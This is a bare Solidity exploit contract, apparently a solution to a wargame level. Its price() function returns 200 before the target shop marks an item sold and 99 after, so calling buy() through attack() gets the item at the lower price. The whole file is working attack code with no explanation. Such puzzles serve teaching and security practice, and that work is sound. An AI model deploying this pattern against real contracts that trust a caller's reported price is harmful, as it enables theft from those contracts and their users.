interface Shop {
    function price() external view returns (uint256);
    function isSold() external view returns (bool);
    function buy() external;
}

contract DynamicPriceShopAttacker {
    Shop private shop;

    constructor(address _shopAddress) {
        shop = Shop(_shopAddress);
    }

    function price() external view returns (uint256) {
        if (shop.isSold()) {
            return 99;
        } else {
            return 200;
        }
    }

    function attack() external {
        shop.buy();
    }
}